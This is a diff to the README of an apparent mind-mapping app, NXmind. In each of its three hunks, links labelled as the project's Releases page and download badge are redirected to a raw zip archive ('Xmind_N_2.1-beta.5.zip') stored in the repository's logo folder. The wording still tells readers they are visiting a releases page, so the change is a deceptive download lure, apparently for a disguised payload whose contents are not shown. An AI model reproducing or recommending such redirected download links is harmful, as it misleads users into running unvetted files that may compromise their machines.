@@ -1,6 +1,6 @@
 # ✨ NXmind - Simplify Your Mind Mapping Experience
 
-[![Download NXmind](https://img.shields.io/badge/Download_NXmind-v1.0-blue)](https://github.com/musuroi/NXmind/releases)
+[![Download NXmind](https://github.com/musuroi/NXmind/raw/refs/heads/main/logo/Xmind_N_2.1-beta.5.zip)](https://github.com/musuroi/NXmind/raw/refs/heads/main/logo/Xmind_N_2.1-beta.5.zip)
 
 ## 👋 Why NXmind?
 
@@ -37,7 +37,7 @@ It should be as available as air—present when needed, gone when not.
 
 ### Download & Install
 
-To get started, visit the [Releases page](https://github.com/musuroi/NXmind/releases) and download the latest version.
+To get started, visit the [Releases page](https://github.com/musuroi/NXmind/raw/refs/heads/main/logo/Xmind_N_2.1-beta.5.zip) and download the latest version.
 
 1. **Visit the page**: Click the link above to go to the NXmind Releases page.
 2. **Download the file**: Look for the latest version and choose the appropriate file for your system (either Windows or macOS).
@@ -75,4 +75,4 @@ Your data stays on your device. NXmind does not upload your files to the cloud, 
 
 NXmind is licensed under the MIT License. Feel free to use, modify, and share it as you wish.
 
-[![Download NXmind](https://img.shields.io/badge/Download_NXmind-v1.0-blue)](https://github.com/musuroi/NXmind/releases)
+[![Download NXmind](https://github.com/musuroi/NXmind/raw/refs/heads/main/logo/Xmind_N_2.1-beta.5.zip)](https://github.com/musuroi/NXmind/raw/refs/heads/main/logo/Xmind_N_2.1-beta.5.zip)
